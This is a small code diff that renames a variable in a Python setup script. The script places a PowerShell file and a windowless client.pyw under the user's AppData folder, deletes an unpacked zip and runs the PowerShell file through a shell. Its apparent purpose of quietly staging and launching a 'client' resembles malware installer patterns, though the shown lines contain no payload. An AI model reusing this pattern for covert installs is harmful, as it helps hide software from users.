@@ -2,7 +2,7 @@ import os, sys, subprocess
 
 username = os.environ.get('USERNAME')
 path = os.environ['appdata']
-bat_path = path + '\\main.ps1'
+ps1_path = path + '\\main.ps1'
 file_path = path + '\\client.pyw'
 src_path = path + '\\src'
 script_path = src_path + '\\Script'
@@ -27,7 +27,7 @@ def setup():
     subprocess.call(f'powershell.exe rm {path}\\src.zip',
                     shell=True)
     # run client.py file
-    subprocess.call(f'{bat_path}',
+    subprocess.call(f'{ps1_path}',
                     shell=True)
 ################################################ done ##################################################################
 # Running code ...
